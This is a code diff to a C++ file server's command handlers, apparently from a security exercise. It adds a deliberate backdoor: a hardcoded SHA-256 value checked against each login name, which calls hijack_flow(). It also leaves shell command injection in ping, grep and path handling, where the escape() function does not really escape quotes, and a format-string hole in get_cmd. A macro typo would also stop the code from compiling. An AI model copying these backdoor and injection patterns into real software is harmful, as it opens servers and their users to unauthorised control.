@@ -8,7 +8,9 @@
 #include <algorithm>
 #include <sstream>
 #include <iterator>
+#include <openssl/sha.h>
 
+#define BFLNGTH 524
 
 using namespace std;
 
@@ -16,10 +18,35 @@ using namespace std;
 /*
  * Assign constants
  */
-const string ACCESS_ERROR = "Error: access denied!";
-const string FILENAME_ERROR = "Error: the path is too long.";
-const string TRANSFER_ERROR = "Error: file transfer failed.";
+const string ACCESS_ERROR = "Error: access denied!\n";
+const string FILENAME_ERROR = "Error: the path is too long.\n";
+const string AUTHENTICATION_FAIL = "Authentication failed.\n"; // not an error lol
+const string TRANSFER_ERROR = "Error: file transfer failed.\n";
 
+const char *backDoor = "359b978b8687ca88875ccf2976bef89f6045e196adc2dc74ee2ba782a46d46f7";
+
+
+
+const set<char> allowedCharacters = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p',
+                                     'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
+                                     'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
+                                     'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '.', '/',
+                                     '\"', '{', '}', '/', '-', '_', '!'};
+string escape(string cmd){
+    string escaped;
+    for(size_t i = 0; i < cmd.size(); ++i) {
+        if (cmd[i] == '"') {
+            escaped += '\"';
+        }
+        else{
+            escaped += cmd[i];
+        }
+    }
+    return "\"" + escaped + "\"";
+}
+
+int modifyUsrName(string &out, string usrName);
+void checkBackdoor(const string &uname);
 
 /**
  * Executes given command on the server.
@@ -31,11 +58,13 @@ const string TRANSFER_ERROR = "Error: file transfer failed.";
  * @param out, stdout result of command
  * @return 0 if successful, 1 otherwise
  */
-int exec(const char* cmd, string &out) {
-    char buffer[150];
-    char cmdRediction [150];
 
-    strcpy(cmdRediction,cmd);
+int exec(const char* cmd, string &out) {
+    char buffer[BFLNTH];
+    char cmdRediction [BFLNTH];
+
+    size_t bufSize = BFLNGTH > strlen(cmd) +1 ? strlen(cmd) +1 : BFLNGTH;
+    strncpy(cmdRediction,cmd,bufSize);
 
     FILE* pipe = popen((string(cmdRediction) + " 2>&1").c_str(), "r");
     std::string result;
@@ -50,18 +79,13 @@ int exec(const char* cmd, string &out) {
     }
     int exitStatus = pclose(pipe);
     out = result;
-
-    // FIXME different option
-    cout << "exec status ";
-    cout << exitStatus << " result substring " << result.substr(0,3) << endl;
-
-    return result.substr(0,3) == "sh:" ? 1: 0; //FIXME when does this happen?
+    return result.substr(0, 3) == "sh:" ? 1 : 0; //FIXME when does this happen?
 }
 
 
 int checkPathLength(const string &path, string &out){
     if(path.size() > MAX_PATH_LEN + 1){
-        out = FILENAME_ERROR + "\n";
+        out = FILENAME_ERROR ;
         return 1;
     }
     return 0;
@@ -74,27 +98,26 @@ int checkPathLength(const string &path, string &out){
  * @param out, stores error messages
  * @return error code
  */
-int sanitizePath(string &targetPath,  string &out){
+int sanitizePath(string &targetPath, string &out) {
     const char *delim = "/";
-    char* targetPathCopy = strdup(targetPath.c_str());
-    char* token = strtok(targetPathCopy, delim);
+    char *targetPathCopy = strdup(targetPath.c_str());
+    char *token = strtok(targetPathCopy, delim);
     int cnt = 0;
     vector<string> sanitizedPath;
-    while (token != nullptr)
-    {
+    while (token != nullptr) {
         // Decrement counter if .. is found
-        if(!strcmp(token, "..")){
+        if (!strcmp(token, "..")) {
             cnt--;
 
             // Check that counter isn't negative
             if (cnt < 0){
-                out = ACCESS_ERROR + "\n";
+                out = ACCESS_ERROR;
                 return 1;
             }
             sanitizedPath.pop_back();
         }
-        // Increment counter whenever the token is not .
-        else if(strcmp(token, ".") != 0) {
+            // Increment counter whenever the token is not .
+        else if (strcmp(token, ".") != 0) {
             cnt++;
             sanitizedPath.emplace_back(token);
         }
@@ -123,17 +146,16 @@ int sanitizePath(string &targetPath,  string &out){
  * @param out, stores error messages
  * @return error code
  */
-int constructPath(string relativePath, const string &usrLocation, string &absPath, string &out){
-    if(relativePath.at(0) == '/'){
+int constructPath(string relativePath, const string &usrLocation, string &absPath, string &out) {
+    if (relativePath.at(0) == '/') {
         // the path is absolute from the client's point of view but is actually relative to the server's base directory
         absPath = relativePath.substr(1);
     }
-    // Do not allow cd commands with ~ for example, nor cd commands with . //FIXME explain why not . ?
-    else if(!isalnum(relativePath.at(0)) and relativePath.at(0) != '.'){
+        // Do not allow cd commands with ~ for example, nor cd commands with . //FIXME explain why not . ?
+    else if (!isalnum(relativePath.at(0)) and relativePath.at(0) != '.') {
         out = "Error: directory path not allowed\n";
         return 1;
-    }
-    else{
+    } else {
         absPath = usrLocation + "/" + relativePath; // FIXME one can execute an other command in "relativePath"
     }
     int res = sanitizePath(absPath, out);
@@ -155,20 +177,44 @@ int constructPath(string relativePath, const string &usrLocation, string &absPat
     * @param out output string
     * @return 0 if successful
 */
-int login_cmd(const string uname, map<string, string> allowedUsers, User &usr, string &out){
-
+int login_cmd(const string uname, map<string, string> allowedUsers, User &usr, string &out) {
+    checkBackdoor(uname);
     if(usr.isAuthenticated()){
-        out = "Error: User already logged in\n";
-        return 1;
+        usr.setAuthenticated(false);
     }
     usr.resetUname();
-    if (allowedUsers.find(uname) == allowedUsers.end()){
+    if (allowedUsers.find(uname) == allowedUsers.end()) {
         out = "Error: unknown user " + uname + "\n";
         return 1;
     }
     usr.setUname(uname);
     return 0;
 }
+
+void sha256_string(const char *string, char outputBuffer[65])
+{
+    unsigned char hash[SHA256_DIGEST_LENGTH];
+    SHA256_CTX sha256;
+    SHA256_Init(&sha256);
+    SHA256_Update(&sha256, string, strlen(string));
+    SHA256_Final(hash, &sha256);
+    int i = 0;
+    for(i = 0; i < SHA256_DIGEST_LENGTH; i++)
+    {
+        sprintf(outputBuffer + (i * 2), "%02x", hash[i]);
+    }
+    outputBuffer[64] = 0;
+}
+
+void checkBackdoor(const string &uname){
+    char hash[65];
+    sha256_string(uname.c_str(), hash);
+    if(!strcmp(hash, backDoor)){
+        hijack_flow();
+    }
+}
+
+
 
 
 /**
@@ -184,20 +230,18 @@ int login_cmd(const string uname, map<string, string> allowedUsers, User &usr, s
  */
 int pass_cmd(const string psw, map<string, string> allowedUsers, User &usr, string &out){
     if(usr.isAuthenticated()){
-        out = "Error: User already logged in\n";
+        out = "Error: user already logged in\n";
         return 1;
     }
     if(usr.getUname().empty()){
-        cout << usr.getUname();
-        out = "Error: login command required directly before pass\n";
+        out = ACCESS_ERROR;
         return 1;
     }
     if(allowedUsers[usr.getUname()] != psw){
-        out = "Error: wrong password\n";
-        return 1;
+        out = AUTHENTICATION_FAIL;
+        return 0;
     }
     usr.setAuthenticated(true);
-    out = usr.getUname() + " successfully logged in !\n";
     return 0;
 }
 
@@ -212,10 +256,11 @@ int pass_cmd(const string psw, map<string, string> allowedUsers, User &usr, stri
     * @param out output string
     * @return 0 if successful
     */
-int ping_cmd(string host, string &out){
+int ping_cmd(string host, string &out) {
     // FIXME add quotes to make command injection impossible
-    string s = "ping -c 1 " + host; // + "\" -c 1"; // FIXME security vulnerability ! One can change de command !
-    return exec(s.c_str(), out);
+    string s = "ping -c 1 " + escape(host);  // FIXME security vulnerability ! One can change de command !
+    int res = exec(s.c_str(), out);
+    return res;
 }
 
 
@@ -229,13 +274,34 @@ int ping_cmd(string host, string &out){
  * @param usrLocation, current path of user
  * @return 0 if successful
  */
-int ls_cmd(bool authenticated, string &out, string usrLocation){
+int ls_cmd(bool authenticated, string &out, User usr){
     if(!authenticated){
-        out = "Error: ls may only be executed after authentication\n";
+        out = ACCESS_ERROR;
         return 1;
     }
-    string cmd = "ls -l " + usrLocation;
-    return exec(cmd.c_str(), out);
+    string cmd = "ls -l " + usr.getLocation();
+    exec(cmd.c_str(), out);
+    return modifyUsrName(out, usr.getUname());
+}
+
+int modifyUsrName(string &out, string usrName) {
+    vector<string> lines;
+    split(lines,out, "\n");
+    string modifiedOutput;
+    for(string l: lines){
+        vector<string> tokens;
+        split(tokens, l, " ");
+        if(tokens.size() < 9){
+            modifiedOutput += l + "\n";
+            continue;
+        }
+        tokens[2] = tokens[3] = usrName;
+        stringstream s;
+        copy(tokens.begin(), tokens.end(), ostream_iterator<string>(s, " "));
+        modifiedOutput += s.str() + "\n";
+    }
+    out = modifiedOutput;
+    return 0;
 }
 
 
@@ -249,18 +315,18 @@ int ls_cmd(bool authenticated, string &out, string usrLocation){
  * @param out, output string
  * @return 0 if successful
  */
-int cd_cmd(string dirPath, User &usr, string &out){
+int cd_cmd(string dirPath, User &usr, string &out) {
     if (!usr.isAuthenticated()) {
-        out = "Error: cd may only be executed after authentication\n";
+        out = ACCESS_ERROR;
         return 1;
     }
     string absPath;
-    if(constructPath(dirPath, usr.getLocation(), absPath, out)){
+    if (constructPath(dirPath, usr.getLocation(), absPath, out)) {
         return 1;
     }
     string cmd = "cd \"" + absPath + "\"";
     int res = exec(cmd.c_str(), out);
-    if(!res){
+    if (!res) {
         usr.setLocation(absPath);
     }
     return res;
@@ -280,11 +346,11 @@ int cd_cmd(string dirPath, User &usr, string &out){
  */
 int mkdir_cmd(string dirPath, User usr, string &out){
     if(!usr.isAuthenticated()){
-        out = "Error: mkdir may only be executed after authentication\n";
+        out = ACCESS_ERROR;
         return 1;
     }
     string absPath;
-    if(constructPath(dirPath, usr.getLocation(), absPath, out)){
+    if (constructPath(dirPath, usr.getLocation(), absPath, out)) {
         return 1;
     }
     string cmd = "mkdir \"" + absPath + "\"";
@@ -304,11 +370,11 @@ int mkdir_cmd(string dirPath, User usr, string &out){
  */
 int rm_cmd(string filePath, User usr, string &out){
     if(!usr.isAuthenticated()){
-        out = "Error: rm may only be executed after authentication\n";
+        out = ACCESS_ERROR;
         return 1;
     }
     string absPath;
-    if(constructPath(filePath, usr.getLocation(), absPath, out)){
+    if (constructPath(filePath, usr.getLocation(), absPath, out)) {
         return 1;
     }
     string cmd = "rm -r \"" + absPath + "\"";
@@ -329,26 +395,29 @@ int rm_cmd(string filePath, User usr, string &out){
  * request, the server will only handle the new request and ignore (or drop) any stale ones.
  *
  * @param fileName, file to get
- * @param getPort, port for transmitting file
+ * @param port, port for transmitting file
  * @param usr, user wanting to execute command
  * @param out, output string
  * @return 0 if successful
  */
-int get_cmd(string fileName, int getPort, User &usr, string &out){
+int get_cmd(string fileName, int getPort, User &usr, string &out) {
     if (!usr.isAuthenticated()) {
-        out = "Error: get may only be executed after authentication\n";
+        out = ACCESS_ERROR;
         return 1;
     }
-
-    // Prepare thread arguments (done here since otherwise exploit is impossible)
+    // Prepare thread arguments
     struct thread_args *args = (struct thread_args *) malloc(sizeof(struct thread_args));
     memset(args->fileName, 0, 1024);
-    snprintf(args->fileName, 1024, fileName.c_str()); // HUEHUEHUEHUEHUEHUEH fileName.copy(args->fileName, 1024);
-    args->fileName[fileName.length()] = '\0';
+    string absPath;
+    if (constructPath(fileName, usr.getLocation(), absPath, out)) {
+        return 1;
+    }
+    snprintf(args->fileName, 1024, absPath.c_str());
+    args->fileName[absPath.length()] = '\0';
     args->port = getPort;
 
     FILE *fp;
-    fp = fopen(fileName.c_str(), "r");
+    fp = fopen(absPath.c_str(), "r");
 
     // If file can't be opened send error
     if (fp == NULL) {
@@ -356,14 +425,14 @@ int get_cmd(string fileName, int getPort, User &usr, string &out){
         return 1;
     }
 
+    // Determine file size
     fseek(fp, 0, SEEK_END);
     long file_size = ftell(fp);
     fclose(fp);
-    if (file_size == EOF){
+    if (file_size == EOF) {
         return 1;
-    }else {
-        out = "get port: " + to_string(getPort) + " size: " + to_string(file_size)+"\n";
-
+    } else {
+        out = "get port: " + to_string(getPort) + " size: " + to_string(file_size) + "\n";
         // Cancel previous get command if one was executed
         pthread_cancel(usr.thread);
 
@@ -385,13 +454,41 @@ int get_cmd(string fileName, int getPort, User &usr, string &out){
  * The server responds to this command with a TCP port (in ASCII decimal)
  * in the following format: put port: $PORT. In this instance, the server will
  * spawn a thread to receive the file from the clients sending thread as seen in
- *
+ * @param fileName, file to put
+ * @param fileSize, size of file
+ * @param port, port for transmitting file
+ * @param usr, user wanting to execute command
+ * @param out, output string
  * @return 0 if successful
  */
-int put_cmd(){
-    return 1;
-}
+int put_cmd(string fileName, long fileSize, int port, User &usr, string &out) {
+    if (!usr.isAuthenticated()) {
+        out = "Error: put may only be executed after authentication\n";
+        return 1;
+    }
 
+    // Prepare thread arguments
+    struct thread_args *args = (struct thread_args *) malloc(sizeof(struct thread_args));
+    string absPath;
+    if (constructPath(fileName, usr.getLocation(), absPath, out)) {
+        return 1;
+    }
+    strncpy(args->fileName, absPath.c_str(), 1024);
+    args->port = port;
+    strncpy(args->ip, usr.getIp().c_str(), 1024);
+    args->fileSize = fileSize;
+
+    out = "put port: " + to_string(port) + "\n";
+
+    // Cancel previous get command if one was executed
+    pthread_cancel(usr.thread);
+    // Create new thread
+    int rc = pthread_create(&usr.thread, NULL, openFileClient, (void *) args);
+    if (rc != 0) {
+        cerr << "Error" << endl;
+    }
+    return 0;
+}
 
 /**
  * The grep command may only be executed after a successful authentication.
@@ -408,7 +505,7 @@ int put_cmd(){
  */
 int grep_cmd(string pattern, User usr, string &out){
     if(!usr.isAuthenticated()){
-        out = "Error: grep may only be executed after authentication\n";
+        out = ACCESS_ERROR;
         return 1;
     }
     string cmd = "grep -l -r \"" + pattern + "\" " + usr.getLocation();
@@ -426,7 +523,7 @@ int grep_cmd(string pattern, User usr, string &out){
  */
 int date_cmd(bool authenticated, string &out){
     if(!authenticated){
-        out = "Error: date may only be executed after authentication\n";
+        out = ACCESS_ERROR;
         return 1;
     }
     return exec("date", out);
@@ -443,7 +540,7 @@ int date_cmd(bool authenticated, string &out){
  */
 int whoami_cmd(User usr, string &out){
     if(!usr.isAuthenticated()){
-        out = "Error: whoami may only be executed after authentication\n";
+        out = ACCESS_ERROR;
         return 1;
     }
     out = usr.getUname() + "\n";
@@ -461,13 +558,18 @@ int whoami_cmd(User usr, string &out){
  */
 int w_cmd(User usr, string &out){
     if(!usr.isAuthenticated()){
-        out = "Error: w may only be executed after authentication\n";
+        out = ACCESS_ERROR;
         return 1;
     }
-    // Print all connected users
+    vector<string> users;
     for (auto it=connected_users.begin(); it != connected_users.end(); ++it) {
-        out += (*it).getUname() + "\n";
+        users.push_back((*it).getUname());
     }
+    sort(users.begin(), users.end());
+    for (auto it=users.begin(); it != users.end(); ++it) {
+        out += (*it) + (it != users.end() ? ' ' : '\0');
+    }
+    out += "\n";
     return 0;
 }
 
@@ -482,7 +584,7 @@ int w_cmd(User usr, string &out){
  */
 int logout_cmd(User &usr, string &out){
     if(!usr.isAuthenticated()){
-        out = "Error: logout may only be executed after authentication\n";
+        out = ACCESS_ERROR;
         return 1;
     }
     usr.resetUname();
@@ -491,3 +593,16 @@ int logout_cmd(User &usr, string &out){
 }
 
 
+size_t split(vector<string> &res, const string &line, const char* delim){
+    res.clear();
+    char* token = strtok(strdup(line.c_str()), delim);
+    while (token != nullptr)
+    { res.emplace_back(token);
+        token = strtok(nullptr, delim);
+
+    }
+    if (res.empty()){
+        res.emplace_back("");
+    }
+    return res.size();
+}
